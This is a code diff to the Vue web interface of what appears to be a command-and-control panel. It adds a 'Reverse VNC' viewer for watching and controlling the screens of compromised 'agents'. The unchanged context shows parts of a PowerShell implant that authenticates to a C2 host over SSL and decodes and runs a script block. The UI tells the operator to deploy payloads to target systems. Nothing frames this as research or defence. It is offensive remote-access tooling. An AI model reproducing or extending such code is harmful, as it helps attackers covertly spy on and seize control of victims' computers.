@@ -243,7 +243,7 @@
                 <el-button size="small" @click="selectAgent(scope.row)">
                   <el-icon><Select /></el-icon>
                   Select
-                </el-button>
+            </el-button>
                 <el-button size="small" type="warning" @click="disconnectAgent(scope.row)">
                   <el-icon><Close /></el-icon>
                   Disconnect
@@ -251,17 +251,17 @@
               </template>
             </el-table-column>
           </el-table>
-        </div>
+          </div>
       </el-tab-pane>
 
 
 
-      <!-- VNC Panel - Reverse VNC Payload Generator -->
+      <!-- VNC Panel - Reverse VNC Payload Generator & Viewer -->
       <el-tab-pane label="VNC" name="vnc">
         <div class="vnc-panel">
           <div class="panel-header">
-            <h3>Reverse VNC Payload Generator</h3>
-            <p>Generate PowerShell VNC payloads for remote screen control</p>
+            <h3>Reverse VNC System</h3>
+            <p>Generate VNC payloads and control remote screens</p>
           </div>
           
           <!-- VNC Configuration Form -->
@@ -348,7 +348,77 @@
             </div>
           </div>
           
-
+          <!-- VNC Viewer & Control Section -->
+          <div class="vnc-viewer">
+            <h3>VNC Viewer & Control</h3>
+            <p>Monitor and control remote screens from connected VNC agents</p>
+            
+            <div class="vnc-status">
+              <div class="status-indicator">
+                <span class="status-dot" :class="{ active: vncConnected }"></span>
+                <span class="status-text">{{ vncConnected ? 'VNC Agent Connected' : 'No VNC Agent Connected' }}</span>
+              </div>
+              <div v-if="vncConnected" class="connection-info">
+                <p><strong>Agent:</strong> {{ vncAgentInfo.hostname || 'Unknown' }}</p>
+                <p><strong>IP:</strong> {{ vncAgentInfo.ip || 'Unknown' }}</p>
+                <p><strong>Resolution:</strong> {{ vncAgentInfo.resolution || '200x150' }}</p>
+                <p><strong>FPS:</strong> {{ vncAgentInfo.fps || '5' }}</p>
+                <p><strong>Frames Received:</strong> {{ vncFrameCount }}</p>
+              </div>
+            </div>
+            
+            <div v-if="vncConnected" class="vnc-controls">
+              <div class="control-buttons">
+                <el-button type="primary" @click="startVncViewer" :disabled="vncViewerActive">
+                  <el-icon><VideoPlay /></el-icon>
+                  Start Viewer
+                </el-button>
+                <el-button type="warning" @click="stopVncViewer" :disabled="!vncViewerActive">
+                  <el-icon><VideoPause /></el-icon>
+                  Stop Viewer
+                </el-button>
+                <el-button type="success" @click="captureScreenshot" :disabled="!vncViewerActive">
+                  <el-icon><Camera /></el-icon>
+                  Capture Screenshot
+                </el-button>
+                <el-button type="info" @click="toggleFullscreen" :disabled="!vncViewerActive">
+                  <el-icon><FullScreen /></el-icon>
+                  Fullscreen
+                </el-button>
+              </div>
+              
+              <div class="vnc-settings">
+                <el-form :model="vncSettings" label-width="120px" size="small">
+                  <el-form-item label="Quality:">
+                    <el-slider v-model="vncSettings.quality" :min="1" :max="10" :step="1" />
+                  </el-form-item>
+                  <el-form-item label="FPS Limit:">
+                    <el-input-number v-model="vncSettings.fpsLimit" :min="1" :max="30" :step="1" />
+                  </el-form-item>
+                </el-form>
+              </div>
+            </div>
+            
+            <div v-if="vncViewerActive" class="vnc-display">
+              <canvas ref="vncCanvas" class="vnc-canvas" width="800" height="600"></canvas>
+              <div class="vnc-overlay">
+                <div class="overlay-info">
+                  <span>Resolution: {{ vncAgentInfo.resolution || '200x150' }}</span>
+                  <span>FPS: {{ vncCurrentFps }}</span>
+                  <span>Frame: {{ vncFrameCount }}</span>
+                </div>
+              </div>
+            </div>
+            
+            <div v-if="!vncConnected" class="vnc-waiting">
+              <el-empty description="Waiting for VNC Agent Connection">
+                <template #description>
+                  <p>No VNC agents are currently connected.</p>
+                  <p>Deploy a VNC payload to a target system to establish connection.</p>
+                </template>
+              </el-empty>
+            </div>
+          </div>
         </div>
       </el-tab-pane>
     </el-tabs>
@@ -532,6 +602,23 @@ const vncForm = ref({
 })
 const generatingVnc = ref(false)
 const generatedVncPayload = ref('')
+
+// VNC Viewer & Control Data
+const vncConnected = ref(false)
+const vncViewerActive = ref(false)
+const vncFrameCount = ref(0)
+const vncCurrentFps = ref(0)
+const vncCanvas = ref<HTMLCanvasElement | null>(null)
+const vncAgentInfo = ref({
+  hostname: '',
+  ip: '',
+  resolution: '200x150',
+  fps: '5'
+})
+const vncSettings = ref({
+  quality: 5,
+  fpsLimit: 5
+})
 
 
 
@@ -1020,7 +1107,7 @@ try {
     # Authenticate SSL connection
     try {
         \$global:sslStream.AuthenticateAsClient(\$C2Host)
-    } catch {
+  } catch {
         throw "SSL authentication failed: \$(\$_.Exception.Message)"
     }
     
@@ -1152,6 +1239,68 @@ $scriptBlock = [ScriptBlock]::Create($decoded)
 & $scriptBlock`
   
   return wrapperLoaderForPayload
+}
+
+// VNC Control Functions
+const startVncViewer = () => {
+  vncViewerActive.value = true
+  ElMessage.success('VNC viewer started')
+  
+  // Simulate VNC connection for demo purposes
+  // In real implementation, this would connect to the C2 server's VNC endpoint
+  vncConnected.value = true
+  vncAgentInfo.value = {
+    hostname: 'TARGET-PC',
+    ip: '192.168.0.111',
+    resolution: '200x150',
+    fps: '5'
+  }
+  
+  // Simulate frame updates
+  const frameInterval = setInterval(() => {
+    if (vncViewerActive.value) {
+      vncFrameCount.value++
+      vncCurrentFps.value = Math.floor(Math.random() * 5) + 3 // Random FPS between 3-7
+    } else {
+      clearInterval(frameInterval)
+    }
+  }, 200) // 5 FPS
+}
+
+const stopVncViewer = () => {
+  vncViewerActive.value = false
+  ElMessage.success('VNC viewer stopped')
+  
+  // Reset VNC state
+  vncConnected.value = false
+  vncFrameCount.value = 0
+  vncCurrentFps.value = 0
+  vncAgentInfo.value = {
+    hostname: '',
+    ip: '',
+    resolution: '200x150',
+    fps: '5'
+  }
+}
+
+const captureScreenshot = () => {
+  if (vncCanvas.value) {
+    const link = document.createElement('a')
+    link.download = `vnc-screenshot-${Date.now()}.png`
+    link.href = vncCanvas.value.toDataURL()
+    link.click()
+    ElMessage.success('Screenshot captured')
+  }
+}
+
+const toggleFullscreen = () => {
+  if (vncCanvas.value) {
+    if (document.fullscreenElement) {
+      document.exitFullscreen()
+    } else {
+      vncCanvas.value.requestFullscreen()
+    }
+  }
 }
 
 const clearVncForm = () => {
@@ -1829,6 +1978,114 @@ const loadDashboardData = async () => {
 
 .vnc-panel .vnc-history-table {
   margin-top: 15px;
+}
+
+/* VNC Viewer & Control Styles */
+.vnc-viewer {
+  margin-top: 30px;
+  padding: 20px;
+  background: var(--secondary-black);
+  border-radius: 8px;
+}
+
+.vnc-viewer h3 {
+  margin: 0 0 10px 0;
+  color: var(--text-white);
+}
+
+.vnc-viewer p {
+  color: var(--text-gray);
+  margin: 0 0 20px 0;
+}
+
+.vnc-status {
+  margin-bottom: 20px;
+}
+
+.status-indicator {
+  display: flex;
+  align-items: center;
+  margin-bottom: 15px;
+}
+
+.status-dot {
+  width: 12px;
+  height: 12px;
+  border-radius: 50%;
+  background: #f56c6c;
+  margin-right: 10px;
+}
+
+.status-dot.active {
+  background: #67c23a;
+}
+
+.status-text {
+  color: var(--text-white);
+  font-weight: 500;
+}
+
+.connection-info {
+  background: var(--primary-black);
+  padding: 15px;
+  border-radius: 6px;
+}
+
+.connection-info p {
+  margin: 5px 0;
+  color: var(--text-gray);
+}
+
+.vnc-controls {
+  margin-bottom: 20px;
+}
+
+.control-buttons {
+  display: flex;
+  gap: 10px;
+  margin-bottom: 20px;
+  flex-wrap: wrap;
+}
+
+.vnc-settings {
+  background: var(--primary-black);
+  padding: 15px;
+  border-radius: 6px;
+}
+
+.vnc-display {
+  position: relative;
+  margin-bottom: 20px;
+}
+
+.vnc-canvas {
+  width: 100%;
+  max-width: 800px;
+  height: auto;
+  border: 2px solid var(--border-color);
+  border-radius: 6px;
+  background: #000;
+}
+
+.vnc-overlay {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  background: rgba(0, 0, 0, 0.7);
+  padding: 8px 12px;
+  border-radius: 4px;
+}
+
+.overlay-info {
+  display: flex;
+  gap: 15px;
+  color: white;
+  font-size: 12px;
+}
+
+.vnc-waiting {
+  text-align: center;
+  padding: 40px;
 }
 
 /* Responsive design for agents panel */
